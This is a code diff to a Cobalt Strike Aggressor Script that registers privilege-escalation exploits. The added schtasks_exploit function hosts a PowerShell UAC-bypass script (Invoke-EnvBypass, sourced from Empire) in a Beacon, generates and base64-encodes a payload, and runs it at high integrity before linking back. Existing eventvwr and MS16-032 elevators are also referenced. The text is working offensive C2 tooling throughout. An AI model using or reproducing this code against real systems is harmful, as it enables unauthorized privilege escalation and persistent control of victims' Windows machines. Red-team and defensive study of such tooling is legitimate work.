@@ -2,7 +2,7 @@
 # Integrate several privilege escalation exploits into Cobalt Strike via Aggressor Script
 # 
 
-# Integrate 
+# Integrate schtasks.exe (via SilentCleanup) Bypass UAC attack
 # Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
 sub schtasks_elevator {
 	local('$handle $script $oneliner $command');
@@ -26,6 +26,38 @@ sub schtasks_elevator {
 }
 
 beacon_elevator_register("uac-schtasks", "Bypass UAC with schtasks.exe (via SilentCleanup)", &schtasks_elevator);
+
+# Integrate schtasks.exe (via SilentCleanup) Bypass UAC attack as an exploit!
+# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
+sub schtasks_exploit {
+	local('$handle $script $oneliner $command');
+
+	# acknowledge this command
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " in a high integrity context", "T1088");
+
+	# read in the script
+	$handle = openf(getFileProper(script_resource("modules"), "Invoke-EnvBypass.ps1"));
+	$script = readb($handle, -1);
+	closef($handle);
+
+	# host the script in Beacon
+	$exploit_oneliner = beacon_host_script($1, $script);
+
+	# export our payload as a PowerShell script
+	$payload          = artifact_payload($2, "powershell", barch($1));
+	$payload_oneliner = beacon_host_script($1, $payload);
+
+	# format our one-liner into what Invoke-EnvBypass expects
+	$payload_oneliner = transform($payload_oneliner, "powershell-base64");
+
+	# run the specified command via this exploit.
+	bpowerpick!($1, "$exploit_oneliner $+ ; Invoke-EnvBypass -Command \" $+ $payload_oneliner $+ \"");
+
+	# link to our payload if it's a TCP or SMB Beacon
+	beacon_link($1, $null, $2);
+}
+
+beacon_exploit_register("uac-schtasks", "Bypass UAC with schtasks.exe (via SilentCleanup)", &schtasks_exploit);
 
 # Integrate Matt Nelson's file-less eventvwr.exe Bypass UAC attack
 # Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
@@ -178,4 +210,3 @@ sub ms16_032_elevator {
 }
 
 beacon_elevator_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_elevator); 
-
